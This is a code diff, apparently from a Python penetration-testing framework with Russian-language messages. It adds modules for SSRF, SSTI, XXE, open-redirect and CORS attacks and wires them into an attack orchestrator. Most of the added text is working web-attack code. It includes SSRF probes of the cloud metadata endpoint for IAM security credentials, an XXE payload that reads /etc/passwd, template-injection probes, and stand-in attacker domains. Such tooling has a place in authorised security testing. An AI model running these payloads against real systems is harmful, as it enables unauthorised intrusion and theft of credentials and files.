@@ -49,6 +49,11 @@ class AttackVector(str, Enum):
     XSS_EXPLOIT = "xss_exploit"
     COMMAND_INJECTION = "command_injection"
     PATH_TRAVERSAL = "path_traversal"
+    SSRF = "ssrf"
+    SSTI = "ssti"
+    XXE = "xxe"
+    OPEN_REDIRECT = "open_redirect"
+    CORS_MISCONFIG = "cors_misconfig"
 
 
 class TestingModel(str, Enum):
@@ -683,6 +688,270 @@ class PathTraversalModule(BaseAttackModule):
         return None
 
 
+class SsrfModule(BaseAttackModule):
+    module_name = "ssrf_probe"
+    description = "Server-Side Request Forgery: подстановка внутренних/служебных адресов в параметр запроса."
+
+    DEFAULT_PARAM = "url"
+    DEFAULT_TARGETS = [
+        "http://127.0.0.1",
+        "http://localhost",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    ]
+    SIGNATURES = [
+        (r"169\.254\.169\.254", r"(ami-id|instance-id|iam|security-credentials)"),
+        (r"127\.0\.0\.1|localhost", r"(<html|<title|server)"),
+    ]
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        param = context.parameters.get("param", self.DEFAULT_PARAM)
+        targets = context.parameters.get("targets") or self.DEFAULT_TARGETS
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлено {len(targets)} SSRF-целей для параметра '{param}'.",
+                artifacts={"url": url, "param": param, "targets": targets},
+            )
+
+        confirmed: List[Dict[str, Any]] = []
+        for ssrf_target in targets:
+            probe_url = _with_query(url, {param: ssrf_target})
+            try:
+                response = httpx.get(probe_url, timeout=10)
+            except httpx.RequestError:
+                continue
+            for target_pattern, body_pattern in self.SIGNATURES:
+                if re.search(target_pattern, ssrf_target) and re.search(body_pattern, response.text, re.IGNORECASE):
+                    confirmed.append({"target": ssrf_target, "url": probe_url, "status_code": response.status_code})
+                    break
+
+        success = bool(confirmed)
+        details = (
+            f"Подтверждён SSRF через {len(confirmed)} из {len(targets)} целей для параметра '{param}'."
+            if success
+            else f"SSRF не подтверждён для параметра '{param}'."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "param": param, "tested": len(targets)},
+            evidence={"confirmed_targets": confirmed},
+        )
+
+
+class SstiModule(BaseAttackModule):
+    module_name = "ssti_exploit"
+    description = "Server-Side Template Injection: проверка вычисления выражений в шаблонизаторе."
+
+    PROBES = {
+        "{{7*7}}": "49",
+        "${7*7}": "49",
+        "#{7*7}": "49",
+        "<%= 7*7 %>": "49",
+        "${{7*7}}": "49",
+        "@(7*7)": "49",
+    }
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        param = context.parameters.get("param", "name")
+        payloads = context.parameters.get("payloads") or list(self.PROBES.keys())
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлено {len(payloads)} SSTI-проб для параметра '{param}'.",
+                artifacts={"url": url, "param": param, "payloads": payloads},
+            )
+
+        confirmed: List[Dict[str, Any]] = []
+        for payload in payloads:
+            expected = self.PROBES.get(payload, "49")
+            probe_url = _with_query(url, {param: payload})
+            try:
+                response = httpx.get(probe_url, timeout=10)
+            except httpx.RequestError:
+                continue
+            if expected in response.text and payload not in response.text:
+                confirmed.append({"payload": payload, "url": probe_url, "evaluated": expected})
+
+        success = bool(confirmed)
+        details = (
+            f"Подтверждена SSTI через {len(confirmed)} payload'ов для параметра '{param}'."
+            if success
+            else f"SSTI не подтверждена для параметра '{param}'."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "param": param, "tested": len(payloads)},
+            evidence={"confirmed_payloads": confirmed},
+        )
+
+
+class XxeModule(BaseAttackModule):
+    module_name = "xxe_injection"
+    description = "XML External Entity: отправка XML с внешней сущностью для чтения локальных файлов."
+
+    SIGNATURES = {"etc/passwd": r"root:.*:0:0", "win.ini": r"\[fonts\]"}
+    DEFAULT_PAYLOAD_TEMPLATE = (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///{file}">]>'
+        "<root>&xxe;</root>"
+    )
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        target_file = context.parameters.get("file", "etc/passwd")
+        content_type = context.parameters.get("content_type", "application/xml")
+        payload = context.parameters.get("payload") or self.DEFAULT_PAYLOAD_TEMPLATE.format(file=target_file)
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлен XXE payload для файла '{target_file}'.",
+                artifacts={"url": url, "file": target_file, "payload": payload},
+            )
+
+        signature = self._signature_for(target_file)
+        try:
+            response = httpx.post(url, content=payload, headers={"Content-Type": content_type}, timeout=10)
+        except httpx.RequestError as exc:
+            raise RecoverableAttackError(f"XXE запрос не выполнен: {exc}") from exc
+
+        success = bool(signature and re.search(signature, response.text))
+        details = (
+            f"Подтверждено чтение файла '{target_file}' через XXE."
+            if success
+            else f"XXE не подтверждён для файла '{target_file}'."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "file": target_file, "status_code": response.status_code},
+            evidence={"response_snippet": response.text[:500]},
+        )
+
+    def _signature_for(self, target_file: str) -> Optional[str]:
+        for key, signature in self.SIGNATURES.items():
+            if key in target_file.replace("\\", "/"):
+                return signature
+        return None
+
+
+class OpenRedirectModule(BaseAttackModule):
+    module_name = "open_redirect"
+    description = "Open Redirect: проверка перенаправления на сторонний домен через типовые параметры."
+
+    DEFAULT_PARAMS = ["redirect", "url", "next", "return", "dest", "continue", "redir", "out"]
+    DEFAULT_PAYLOAD = "https://evil.example.com"
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        params = context.parameters.get("params") or self.DEFAULT_PARAMS
+        payload = context.parameters.get("payload", self.DEFAULT_PAYLOAD)
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Подготовлено {len(params)} параметров для проверки open redirect.",
+                artifacts={"url": url, "params": params, "payload": payload},
+            )
+
+        confirmed: List[Dict[str, Any]] = []
+        for param in params:
+            probe_url = _with_query(url, {param: payload})
+            try:
+                response = httpx.get(probe_url, timeout=10, follow_redirects=False)
+            except httpx.RequestError:
+                continue
+            location = response.headers.get("location", "")
+            if response.status_code in (301, 302, 303, 307, 308) and payload in location:
+                confirmed.append(
+                    {"param": param, "url": probe_url, "location": location, "status_code": response.status_code}
+                )
+
+        success = bool(confirmed)
+        details = (
+            f"Open redirect подтверждён для параметров: {', '.join(item['param'] for item in confirmed)}."
+            if success
+            else "Open redirect не подтверждён."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "tested": len(params), "payload": payload},
+            evidence={"confirmed_params": confirmed},
+        )
+
+
+class CorsMisconfigModule(BaseAttackModule):
+    module_name = "cors_misconfig"
+    description = "Проверка CORS-конфигурации: отражение произвольного Origin с разрешением credentials."
+
+    DEFAULT_ORIGIN = "https://evil-attacker.example"
+
+    def execute(self, context: AttackContext) -> AttackOutcome:
+        url = _ensure_url(context.parameters.get("url") or context.target)
+        origin = context.parameters.get("origin", self.DEFAULT_ORIGIN)
+
+        if context.dry_run:
+            return AttackOutcome(
+                success=True,
+                status="dry_run",
+                module=self.module_name,
+                details=f"Будет отправлен запрос с заголовком Origin: {origin}.",
+                artifacts={"url": url, "origin": origin},
+            )
+
+        try:
+            response = httpx.get(url, headers={"Origin": origin}, timeout=10)
+        except httpx.RequestError as exc:
+            raise RecoverableAttackError(f"CORS запрос не выполнен: {exc}") from exc
+
+        acao = response.headers.get("access-control-allow-origin", "")
+        acac = response.headers.get("access-control-allow-credentials", "").lower()
+        success = (acao == origin or acao == "*") and acac == "true"
+
+        details = (
+            f"CORS misconfiguration: Access-Control-Allow-Origin='{acao}', Access-Control-Allow-Credentials='{acac}'."
+            if success
+            else f"CORS заголовки не указывают на уязвимость (ACAO='{acao}', ACAC='{acac}')."
+        )
+
+        return AttackOutcome(
+            success=success,
+            status="completed" if success else "no_findings",
+            module=self.module_name,
+            details=details,
+            artifacts={"url": url, "origin": origin, "status_code": response.status_code},
+            evidence={"access_control_allow_origin": acao, "access_control_allow_credentials": acac},
+        )
+
+
 class AttackOrchestrator:
     """Высокоуровневый оркестратор атак Dev B."""
 
@@ -702,6 +971,11 @@ class AttackOrchestrator:
         self.xss_module = XssExploitModule()
         self.cmdi_module = CommandInjectionModule()
         self.path_traversal_module = PathTraversalModule()
+        self.ssrf_module = SsrfModule()
+        self.ssti_module = SstiModule()
+        self.xxe_module = XxeModule()
+        self.open_redirect_module = OpenRedirectModule()
+        self.cors_module = CorsMisconfigModule()
 
         self.modules: Dict[AttackVector, BaseAttackModule] = {
             AttackVector.BRUTE_FORCE: self.brute_module,
@@ -711,6 +985,11 @@ class AttackOrchestrator:
             AttackVector.XSS_EXPLOIT: self.xss_module,
             AttackVector.COMMAND_INJECTION: self.cmdi_module,
             AttackVector.PATH_TRAVERSAL: self.path_traversal_module,
+            AttackVector.SSRF: self.ssrf_module,
+            AttackVector.SSTI: self.ssti_module,
+            AttackVector.XXE: self.xxe_module,
+            AttackVector.OPEN_REDIRECT: self.open_redirect_module,
+            AttackVector.CORS_MISCONFIG: self.cors_module,
         }
 
         self.profiles = self._build_profiles()
@@ -729,6 +1008,11 @@ class AttackOrchestrator:
                     AttackVector.XSS_EXPLOIT,
                     AttackVector.COMMAND_INJECTION,
                     AttackVector.PATH_TRAVERSAL,
+                    AttackVector.SSRF,
+                    AttackVector.SSTI,
+                    AttackVector.XXE,
+                    AttackVector.OPEN_REDIRECT,
+                    AttackVector.CORS_MISCONFIG,
                 },
                 max_parallel=2,
                 rate_limit_per_minute=30,
